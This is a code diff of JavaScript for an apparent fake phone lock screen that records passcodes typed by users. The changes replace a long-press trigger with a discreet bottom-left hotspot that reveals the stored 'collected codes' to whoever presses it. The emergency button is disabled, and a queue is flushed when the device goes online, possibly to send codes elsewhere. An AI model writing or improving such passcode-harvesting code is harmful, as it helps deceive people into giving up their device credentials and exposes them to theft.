@@ -14,12 +14,6 @@
   const QUEUE_KEY = '_pass_queue_';
   const ATT_CODES_KEY = '_pass_attempts_codes_'; // persistent storage key for collected codes
 
-  // long-press config
-  const LONGPRESS_MS = 600;
-  let codesBarTimer = null;
-  let hpStartX = 0;
-  let hpStartY = 0;
-
   function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
   function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
 
@@ -215,190 +209,169 @@
       setTimeout(reset, 300);
     }
 
-    // After 5th attempt reset counter but KEEP stored codes so they can be shown on long-press
+    // After 5th attempt reset counter but KEEP stored codes so they can be shown on hotspot
     if (attempts >= 5) {
       setAttempts(0);
     }
   }
 
-  /* ---------- Minimal codes bar: create dynamically with inline styles (NO buttons) ---------- */
-  function createMinimalCodesBar() {
-    if (document.getElementById('codesBar')) return document.getElementById('codesBar');
+  /* ---------- Bottom-left hotspot + minimal codes display ---------- */
+  function createHotspotAndDisplay() {
+    // Hotspot
+    if (!document.getElementById('codesHotspot')) {
+      const hs = document.createElement('div');
+      hs.id = 'codesHotspot';
+      Object.assign(hs.style, {
+        position: 'fixed',
+        left: '12px',
+        bottom: '12px',
+        width: '56px',
+        height: '56px',
+        borderRadius: '12px',
+        background: 'rgba(255,255,255,0.03)',
+        border: '1px solid rgba(255,255,255,0.06)',
+        zIndex: '12000',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        boxSizing: 'border-box',
+        touchAction: 'none',
+        cursor: 'pointer',
+        // a subtle indicator so it's discoverable; remove or tweak opacity if you want it invisible
+        backdropFilter: 'blur(2px)'
+      });
+      // optional subtle glyph (dot) so user can find
+      const dot = document.createElement('div');
+      Object.assign(dot.style, {
+        width: '10px',
+        height: '10px',
+        borderRadius: '50%',
+        background: 'rgba(255,255,255,0.12)',
+      });
+      hs.appendChild(dot);
+      document.body.appendChild(hs);
+    }
 
-    const bar = document.createElement('div');
-    bar.id = 'codesBar';
-    // inline styles so you don't need to edit CSS
-    Object.assign(bar.style, {
-      position: 'fixed',
-      left: '50%',
-      bottom: '20px',
-      transform: 'translateX(-50%) translateY(20px)',
-      width: 'calc(100% - 32px)',
-      maxWidth: '820px',
-      zIndex: '11000',
-      display: 'flex',
-      justifyContent: 'center',
-      pointerEvents: 'none',
-      opacity: '0',
-      transition: 'opacity 160ms ease, transform 160ms ease',
-      fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
-      fontSize: '14px'
-    });
+    // Codes display box (hidden by default)
+    if (!document.getElementById('codesDisplay')) {
+      const d = document.createElement('div');
+      d.id = 'codesDisplay';
+      Object.assign(d.style, {
+        position: 'fixed',
+        left: '12px',
+        bottom: '80px',
+        width: '280px',
+        maxWidth: 'calc(100% - 24px)',
+        zIndex: '12001',
+        display: 'none',
+        justifyContent: 'center',
+        pointerEvents: 'none',
+        transition: 'opacity 120ms ease, transform 120ms ease'
+      });
 
-    const inner = document.createElement('div');
-    Object.assign(inner.style, {
-      width: '100%',
-      background: 'rgba(0,0,0,0.56)',
-      backdropFilter: 'blur(8px)',
-      WebkitBackdropFilter: 'blur(8px)',
-      borderRadius: '12px',
-      padding: '10px 12px',
-      boxSizing: 'border-box',
-      display: 'flex',
-      gap: '10px',
-      justifyContent: 'center',
-      alignItems: 'center',
-      flexWrap: 'wrap',
-      pointerEvents: 'none',
-      color: '#fff',
-      boxShadow: '0 10px 30px rgba(0,0,0,0.45)'
-    });
+      const inner = document.createElement('div');
+      inner.id = 'codesDisplayInner';
+      Object.assign(inner.style, {
+        width: '100%',
+        background: 'rgba(0,0,0,0.7)',
+        borderRadius: '12px',
+        padding: '12px',
+        boxSizing: 'border-box',
+        display: 'flex',
+        gap: '8px',
+        flexWrap: 'wrap',
+        justifyContent: 'center',
+        alignItems: 'center',
+        color: '#fff',
+        fontSize: '18px',
+        fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
+        fontWeight: '700',
+        letterSpacing: '0.6px'
+      });
 
-    inner.id = 'codesInner';
-    bar.appendChild(inner);
-    document.body.appendChild(bar);
-    return bar;
+      d.appendChild(inner);
+      document.body.appendChild(d);
+    }
   }
 
-  function populateAndShowMinimalBar() {
+  function showCodesAtBottomLeft() {
     if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
-    const bar = createMinimalCodesBar();
-    const inner = document.getElementById('codesInner');
-    inner.innerHTML = ''; // clear
-
+    createHotspotAndDisplay();
+    const bar = document.getElementById('codesDisplay');
+    const inner = document.getElementById('codesDisplayInner');
+    inner.innerHTML = '';
     const codes = getStoredAttemptCodes();
-    if (!codes || codes.length === 0) {
-      const s = document.createElement('span');
-      s.textContent = '';
-      inner.appendChild(s);
+    if (!codes || !codes.length) {
+      const e = document.createElement('div');
+      e.textContent = '';
+      inner.appendChild(e);
     } else {
       codes.forEach(c => {
-        const pill = document.createElement('span');
+        const pill = document.createElement('div');
         pill.textContent = c;
         Object.assign(pill.style, {
           background: 'rgba(255,255,255,0.08)',
-          padding: '6px 10px',
-          borderRadius: '999px',
-          fontWeight: '700',
-          letterSpacing: '.5px',
           color: '#fff',
-          pointerEvents: 'none'
+          padding: '8px 12px',
+          borderRadius: '999px',
+          display: 'inline-block',
+          fontSize: '18px',
+          fontWeight: '800',
+          letterSpacing: '0.6px',
+          boxShadow: '0 4px 12px rgba(0,0,0,0.35) inset'
         });
         inner.appendChild(pill);
       });
     }
-
-    // show bar (animate in)
     bar.style.display = 'flex';
-    // force reflow then animate
+    // animate in
     requestAnimationFrame(() => {
-      bar.style.transform = 'translateX(-50%) translateY(0)';
+      bar.style.transform = 'translateY(0)';
       bar.style.opacity = '1';
     });
   }
 
-  function hideMinimalBarNow() {
-    const bar = document.getElementById('codesBar');
+  function hideCodesImmediately() {
+    const bar = document.getElementById('codesDisplay');
     if (!bar) return;
-    bar.style.transform = 'translateX(-50%) translateY(20px)';
+    bar.style.transform = 'translateY(8px)';
     bar.style.opacity = '0';
-    // after transition remove display to keep DOM tidy
     setTimeout(() => {
-      if (bar && bar.parentNode) bar.style.display = 'none';
-    }, 180);
+      if (bar) bar.style.display = 'none';
+    }, 120);
   }
 
-  /* ---------- Long-press handling (homescreen image). Show on long-press; hide on lift ---------- */
-  function onHPDown(ev) {
+  // Hotspot pointer handlers
+  function onHotspotDown(ev) {
+    // only when homescreen visible
     if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
-    hpStartX = ev.clientX;
-    hpStartY = ev.clientY;
-    clearTimeout(codesBarTimer);
-    codesBarTimer = setTimeout(() => {
-      populateAndShowMinimalBar();
-      codesBarTimer = null;
-    }, LONGPRESS_MS);
+    // prevent other interactions
+    ev.preventDefault();
+    // show codes immediately on press (no long press needed)
+    showCodesAtBottomLeft();
+  }
+  function onHotspotUp(ev) {
+    // hide codes as soon as the user lifts finger
+    hideCodesImmediately();
   }
 
-  function onHPMove(ev) {
-    if (!codesBarTimer) return;
-    const dx = Math.abs(ev.clientX - hpStartX);
-    const dy = Math.abs(ev.clientY - hpStartY);
-    // cancel long-press if the finger moved too much (intent to scroll/drag)
-    if (dx > 10 || dy > 10) {
-      clearTimeout(codesBarTimer);
-      codesBarTimer = null;
+  // create hotspot and wire handlers
+  function ensureHotspotListeners() {
+    createHotspotAndDisplay();
+    const hs = document.getElementById('codesHotspot');
+    if (!hs._hotspotAttached) {
+      hs.addEventListener('pointerdown', onHotspotDown);
+      window.addEventListener('pointerup', onHotspotUp);
+      window.addEventListener('pointercancel', onHotspotUp);
+      // also support touchstart/up as fallback (some older browsers)
+      hs.addEventListener('touchstart', onHotspotDown, { passive: false });
+      window.addEventListener('touchend', onHotspotUp);
+      window.addEventListener('touchcancel', onHotspotUp);
+      hs._hotspotAttached = true;
     }
   }
 
-  function onHPUp(ev) {
-    // cancel pending long-press timer
-    if (codesBarTimer) {
-      clearTimeout(codesBarTimer);
-      codesBarTimer = null;
-      return;
-    }
-    // if bar is shown, hide it immediately on lift
-    hideMinimalBarNow();
-  }
-
-  if (homescreenImg) {
-    homescreenImg.addEventListener('pointerdown', onHPDown);
-    homescreenImg.addEventListener('pointermove', onHPMove, { passive: true });
-    homescreenImg.addEventListener('pointerup', onHPUp);
-    homescreenImg.addEventListener('pointercancel', onHPUp);
-    // also support contextmenu on desktop for convenience (will hide on next pointerup)
-    homescreenImg.addEventListener('contextmenu', (e) => {
-      if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
-      e.preventDefault();
-      populateAndShowMinimalBar();
-    });
-  } else {
-    // fallback: attach to document
-    document.addEventListener('pointerdown', onHPDown);
-    document.addEventListener('pointermove', onHPMove, { passive: true });
-    document.addEventListener('pointerup', onHPUp);
-    document.addEventListener('pointercancel', onHPUp);
-    document.addEventListener('contextmenu', (e) => {
-      if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
-      e.preventDefault();
-      populateAndShowMinimalBar();
-    });
-  }
-
-  function animateBrightness(el, target, duration) {
-    let startTime;
-    const initial = parseFloat(el.dataset.brightness || "1");
-    const change = target - initial;
-
-    function easeOutCubic(t) {
-      return 1 - Math.pow(1 - t, 3);
-    }
-
-    function frame(ts) {
-      if (!startTime) startTime = ts;
-      const progress = Math.min((ts - startTime) / duration, 1);
-      const eased = easeOutCubic(progress);
-      const value = initial + change * eased;
-      el.style.filter = `brightness(${value})`;
-      el.dataset.brightness = value.toFixed(3);
-      if (progress < 1) {
-        requestAnimationFrame(frame);
-      }
-    }
-    requestAnimationFrame(frame);
-  }
-
+  /* ---------- wire other behaviours ---------- */
   keys.forEach(k => {
     const num = k.dataset.num;
     if (!num) return;
@@ -430,6 +403,9 @@
 
   emergency && emergency.addEventListener('click', e => e.preventDefault());
   cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });
+
+  // make sure hotspot exists and is listening
+  ensureHotspotListeners();
 
   window.addEventListener('online', flushQueue);
   flushQueue();
